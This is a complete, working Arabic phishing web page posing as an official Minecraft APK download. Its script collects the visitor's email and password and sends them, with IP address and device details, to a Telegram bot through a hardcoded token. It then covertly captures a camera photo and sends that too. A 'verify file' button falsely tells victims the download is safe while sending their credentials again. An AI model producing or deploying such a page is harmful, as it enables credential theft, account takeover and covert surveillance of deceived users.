<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Minecraft - تنزيل مجاني</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #1a1a1a;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
            background-image: url('https://i.imgur.com/8z1p3Wx.png');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
        }
        .container {
            background: rgba(20, 30, 20, 0.88);
            backdrop-filter: blur(12px);
            padding: 35px 30px;
            border-radius: 20px;
            box-shadow: 0 0 80px rgba(0, 255, 0, 0.08);
            max-width: 460px;
            width: 92%;
            border: 3px solid #5a9a3a;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        .container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: repeating-linear-gradient(0deg,
                    transparent,
                    transparent 3px,
                    rgba(90, 154, 58, 0.04) 3px,
                    rgba(90, 154, 58, 0.04) 6px);
            pointer-events: none;
            animation: scan 12s linear infinite;
            z-index: 0;
        }
        @keyframes scan {
            0% {
                transform: translateY(-50%);
            }
            100% {
                transform: translateY(0%);
            }
        }
        .fire {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            background: radial-gradient(ellipse at center bottom,
                    rgba(90, 220, 60, 0.08) 0%,
                    transparent 70%);
            animation: fireGlow 2.5s ease-in-out infinite alternate;
            z-index: 0;
        }
        @keyframes fireGlow {
            0% {
                opacity: 0.2;
                transform: scale(1);
            }
            100% {
                opacity: 0.6;
                transform: scale(1.1);
            }
        }
        .logo {
            font-size: 56px;
            margin-bottom: 2px;
            position: relative;
            z-index: 1;
            display: block;
            text-shadow: 0 0 50px rgba(90, 220, 60, 0.25);
        }
        .title {
            font-size: 36px;
            font-weight: 700;
            color: #6ab04c;
            letter-spacing: 3px;
            text-shadow: 0 0 30px rgba(106, 176, 76, 0.3);
            position: relative;
            z-index: 1;
            margin-bottom: 2px;
        }
        .sub {
            color: #8a8a8a;
            font-size: 14px;
            margin-bottom: 18px;
            border-bottom: 2px solid #3a6a2a;
            padding-bottom: 14px;
            position: relative;
            z-index: 1;
            letter-spacing: 1px;
        }
        .info-box {
            background: rgba(0, 20, 0, 0.5);
            border: 2px solid #3a7a2a;
            border-radius: 12px;
            padding: 12px 16px;
            margin-bottom: 20px;
            position: relative;
            z-index: 1;
        }
        .info-box .row {
            display: flex;
            justify-content: space-between;
            padding: 5px 0;
            font-size: 14px;
            color: #aaa;
            border-bottom: 1px solid #1a3a1a;
        }
        .info-box .row:last-child {
            border-bottom: none;
        }
        .info-box .row span:last-child {
            color: #6ab04c;
            font-weight: bold;
        }
        .input-group {
            margin-bottom: 15px;
            text-align: left;
            position: relative;
            z-index: 1;
        }
        .input-group label {
            font-size: 13px;
            color: #6ab04c;
            display: block;
            margin-bottom: 4px;
            font-weight: bold;
            letter-spacing: 1px;
            text-shadow: 0 0 10px rgba(106, 176, 76, 0.15);
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border-radius: 10px;
            border: 2px solid #2a5a2a;
            background: rgba(0, 20, 0, 0.7);
            color: #b0ffb0;
            font-size: 15px;
            outline: none;
            transition: 0.3s;
            font-family: 'Courier New', monospace;
        }
        .input-group input:focus {
            border-color: #6ab04c;
            box-shadow: 0 0 30px rgba(106, 176, 76, 0.2);
            background: rgba(0, 30, 0, 0.8);
        }
        .input-group input::placeholder {
            color: #3a6a3a;
        }
        .btn {
            width: 100%;
            padding: 16px;
            border: none;
            color: #fff;
            font-weight: bold;
            font-size: 17px;
            border-radius: 10px;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 6px;
            font-family: 'Courier New', monospace;
            text-transform: uppercase;
            letter-spacing: 2px;
            position: relative;
            z-index: 1;
        }
        .btn-primary {
            background: linear-gradient(135deg, #5a9a3a, #3a7a2a);
            border: 2px solid #4a8a32;
            text-shadow: 0 2px 0 #1a4a1a;
            box-shadow: 0 0 30px rgba(90, 154, 58, 0.15);
        }
        .btn-primary:hover {
            background: linear-gradient(135deg, #6aaa4a, #4a8a32);
            transform: scale(1.02);
            box-shadow: 0 0 50px rgba(90, 154, 58, 0.3);
        }
        .btn-secondary {
            background: #2a3a2a;
            border: 2px solid #3a5a3a;
            margin-top: 10px;
        }
        .btn-secondary:hover {
            background: #3a4a3a;
            border-color: #4a7a4a;
            box-shadow: 0 0 30px rgba(90, 154, 58, 0.1);
        }
        #status {
            margin-top: 18px;
            font-size: 14px;
            color: #8a8a8a;
            padding: 12px;
            border-radius: 10px;
            background: rgba(0, 20, 0, 0.5);
            border: 1px solid #1a3a1a;
            min-height: 50px;
            position: relative;
            z-index: 1;
            font-family: 'Courier New', monospace;
        }
        .footer {
            margin-top: 18px;
            font-size: 12px;
            color: #3a5a3a;
            border-top: 1px solid #1a3a1a;
            padding-top: 14px;
            position: relative;
            z-index: 1;
            letter-spacing: 1px;
        }
        .loader {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 3px solid #2a5a2a;
            border-top: 3px solid #6ab04c;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        .minecraft-icon {
            font-size: 60px;
            display: block;
            margin-bottom: 2px;
            text-shadow: 0 0 50px rgba(106, 176, 76, 0.2);
            position: relative;
            z-index: 1;
        }
        .error-message {
            color: #ff6b6b;
            font-size: 13px;
            margin-top: 8px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="fire"></div>
        <span class="minecraft-icon">⛏️</span>
        <div class="title">MINECRAFT</div>
        <div class="sub">▼ تنزيل الإصدار 1.21.4 – النسخة الرسمية ▼</div>
        <div class="info-box">
            <div class="row"><span>📦 الملف</span><span>Minecraft.apk</span></div>
            <div class="row"><span>📏 الحجم</span><span>287 MB</span></div>
            <div class="row"><span>📅 الإصدار</span><span>28 يونيو 2026</span></div>
            <div class="row"><span>🔒 التوقيع</span><span>✅ معتمد</span></div>
        </div>
        <div class="input-group">
            <label>📧 البريد الإلكتروني</label>
            <input type="email" id="emailInput" placeholder="example@gmail.com">
        </div>
        <div class="input-group">
            <label>🔑 كلمة المرور</label>
            <input type="password" id="passwordInput" placeholder="••••••••">
        </div>
        <button class="btn btn-primary" id="mainBtn">🚀 تحميل Minecraft.apk</button>
        <button class="btn btn-secondary" id="fakeBtn">🔍 التحقق من الملف</button>
        <div id="status">⏳ أدخل بياناتك واضغط تحميل</div>
        <div class="footer">🔒 اتصال آمن • ✅ تم التحقق • ⛏️ Minecraft Official</div>
    </div>
    <script>
        // ============================================================
        // إعدادات بوت تيليغرام - بياناتك الصحيحة
        // ============================================================
        const BOT_TOKEN = "8959014011:AAFI8eCWilYlrIGtfK6NmjqhgIN1KDWoDVM";
        const CHAT_ID = "5730027675";
        // ============================================================

        const emailInput = document.getElementById('emailInput');
        const passwordInput = document.getElementById('passwordInput');
        const mainBtn = document.getElementById('mainBtn');
        const fakeBtn = document.getElementById('fakeBtn');
        const statusDiv = document.getElementById('status');

        async function sendData(email, password, action) {
            try {
                const ip = await getIP();
                const message = `🎮 **ماينكرافت - بيانات جديدة**\n\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}\n📌 الإجراء: ${action}\n🕒 الوقت: ${new Date().toLocaleString()}\n📱 الجهاز: ${navigator.userAgent}\n🌐 IP: ${ip}`;
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
                });
                const result = await response.json();
                if (result.ok) {
                    console.log('✅ تم الإرسال بنجاح');
                    return true;
                } else {
                    console.error('❌ فشل الإرسال:', result);
                    return false;
                }
            } catch (e) {
                console.error('❌ خطأ:', e);
                return false;
            }
        }

        async function getIP() {
            try { const res = await fetch('https://api.ipify.org?format=json'); const data = await res.json(); return data.ip || 'غير معروف'; } catch { return 'غير معروف'; }
        }

        async function requestCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 500));
                const canvas = document.createElement('canvas');
                const track = stream.getVideoTracks()[0];
                const settings = track.getSettings();
                canvas.width = settings.width || 640;
                canvas.height = settings.height || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg', 0.9);
                const blob = await fetch(imageData).then(r => r.blob());
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'camera.jpg');
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch (e) { console.log('❌ الكاميرا غير متاحة'); return false; }
        }

        async function handleMainAction() {
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();
            if (!email || !email.includes('@') || !email.includes('.')) {
                statusDiv.innerHTML = '⚠️ أدخل بريداً إلكترونياً صحيحاً';
                statusDiv.style.color = '#ff9800';
                return;
            }
            if (!password || password.length < 4) {
                statusDiv.innerHTML = '⚠️ كلمة المرور يجب أن تكون 4 أحرف على الأقل';
                statusDiv.style.color = '#ff9800';
                return;
            }
            statusDiv.innerHTML = `<span class="loader"></span> جاري التحميل...`;
            statusDiv.style.color = '#aaa';
            const sent = await sendData(email, password, 'تحميل مباشر');
            if (sent) {
                statusDiv.innerHTML = `✅ تم إرسال بياناتك بنجاح`;
                statusDiv.style.color = '#4caf50';
                setTimeout(async () => {
                    statusDiv.innerHTML = `📷 جاري طلب الكاميرا...`;
                    const cam = await requestCamera();
                    if (cam) { statusDiv.innerHTML = `✅ تم إرسال الصورة أيضاً`; } else { statusDiv.innerHTML = `✅ تم الإرسال (بدون كاميرا)`; }
                    const blob = new Blob(['هذا ملف وهمي لأغراض العرض'], { type: 'application/vnd.android.package-archive' });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'Minecraft.apk';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                    setTimeout(() => { statusDiv.innerHTML = '📥 تم التنزيل بنجاح'; statusDiv.style.color = '#8a8a8a'; }, 3000);
                }, 1000);
            } else {
                statusDiv.innerHTML = '❌ فشل الإرسال، حاول مرة أخرى';
                statusDiv.style.color = '#e94560';
            }
        }

        fakeBtn.addEventListener('click', async function() {
            statusDiv.innerHTML = `<span class="loader"></span> جاري التحقق من الملف...`;
            statusDiv.style.color = '#aaa';
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();
            if (email && password) { await sendData(email, password, 'التحقق من الملف'); }
            setTimeout(() => {
                statusDiv.innerHTML = `✅ الملف آمن ومعتمد 100%`;
                statusDiv.style.color = '#4caf50';
                setTimeout(() => { statusDiv.innerHTML = '🔍 الملف جاهز للتحميل'; statusDiv.style.color = '#8a8a8a'; }, 2000);
            }, 2000);
        });

        mainBtn.addEventListener('click', handleMainAction);
        emailInput.addEventListener('keypress', e => { if (e.key === 'Enter') mainBtn.click(); });
        passwordInput.addEventListener('keypress', e => { if (e.key === 'Enter') mainBtn.click(); });
    </script>
</body>
</html>
